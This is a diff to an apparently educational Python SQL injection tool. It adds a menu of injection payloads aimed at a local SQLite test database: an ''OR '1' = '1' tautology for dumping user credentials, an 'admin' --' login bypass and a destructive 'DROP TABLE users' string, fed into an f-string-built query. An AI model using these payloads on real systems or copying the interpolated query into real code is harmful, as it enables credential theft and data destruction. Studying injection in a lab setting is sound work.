@@ -8,21 +8,22 @@ class SQLInjectionAttacks:
         self.attacks = {
             1: {
                 "function": self.get_user_credentials,
-                "sqli_name": "Extract User Credentials"
+                "sqli_name": "Extract User Credentials",
+                "default_query": "'OR '1' = '1"  # Default query for this attack
             }
             # Add more attacks here as needed
         }
 
-    def execute_attack(self, attack_ID, username, db='test.db'):
+    def execute_attack(self, attack_ID, query, db='test.db'):
         """
-        Executes the attack based on the attack_ID.
+        Executes the attack based on the attack_ID and provided query.
         """
         if attack_ID in self.attacks:
-            return self.attacks[attack_ID]["function"](username, db)
+            return self.attacks[attack_ID]["function"](query, db)
         else:
             raise ValueError(f"Invalid attack_ID: {attack_ID}")
 
-    def get_user_credentials(self, username, db='test.db'):
+    def get_user_credentials(self, query, db='test.db'):
         """
         Probes the database for vulnerabilities and attempts to extract all users.
         """
@@ -35,8 +36,8 @@ class SQLInjectionAttacks:
             db_cursor = db_connection.cursor()  # Create a cursor
             print(f"SQLite3: Cursor initialized!")  # Debug
 
-            # Check for vulnerable query in the database
-            probe_query = f"SELECT * FROM users WHERE username = '{username}'"
+            # Construct the query
+            probe_query = f"SELECT * FROM users WHERE username = '{query}'"
             print(f"\nExecuting Query: {probe_query}")  # Debug
 
             db_cursor.execute(probe_query)
@@ -81,6 +82,47 @@ class SQLInjectionAttacks:
                     return attack_ID
             print("Invalid choice. Please try again.")
 
+    def get_query_input(self, attack_ID):
+        """
+        Prompts the user to select a query option: default, manual input, or select from a list.
+        """
+        attack_info = self.attacks[attack_ID]
+        default_query = attack_info.get("default_query", "")
+
+        print("\n=== Query Input Options ===")
+        print("1. Use default query (if available)")
+        print("2. Manually input username/query")
+        print("3. Select from a list of predefined queries")
+        print("===========================")
+
+        while True:
+            option = input("Enter your choice (1, 2, or 3): ").strip()
+            if option == "1":
+                if default_query:
+                    print(f"Using default query: {default_query}")
+                    return default_query
+                else:
+                    print("No default query available for this attack. Please choose another option.")
+            elif option == "2":
+                return input("Enter the username/query to probe: ").strip()
+            elif option == "3":
+                # Example predefined queries (can be expanded)
+                predefined_queries = [
+                    "'OR '1' = '1",
+                    "admin' --",
+                    "'; DROP TABLE users; --"
+                ]
+                print("\nPredefined Queries:")
+                for i, query in enumerate(predefined_queries, start=1):
+                    print(f"{i}. {query}")
+                query_choice = input("Select a query by number: ").strip()
+                if query_choice.isdigit() and 1 <= int(query_choice) <= len(predefined_queries):
+                    return predefined_queries[int(query_choice) - 1]
+                else:
+                    print("Invalid choice. Please try again.")
+            else:
+                print("Invalid option. Please try again.")
+
     def main_menu(self):
         """
         Main menu function to interact with the user.
@@ -96,12 +138,12 @@ class SQLInjectionAttacks:
         if not db:
             db = 'test.db'
 
-        # Get the username input for the attack
-        username = input("Enter the username to probe: ").strip()
+        # Get the query input
+        query = self.get_query_input(attack_ID)
 
         # Execute the selected attack
         print(f"\nExecuting {self.attacks[attack_ID]['sqli_name']}...")
-        result = self.execute_attack(attack_ID, username, db)
+        result = self.execute_attack(attack_ID, query, db)
 
         # Display the results
         if result:
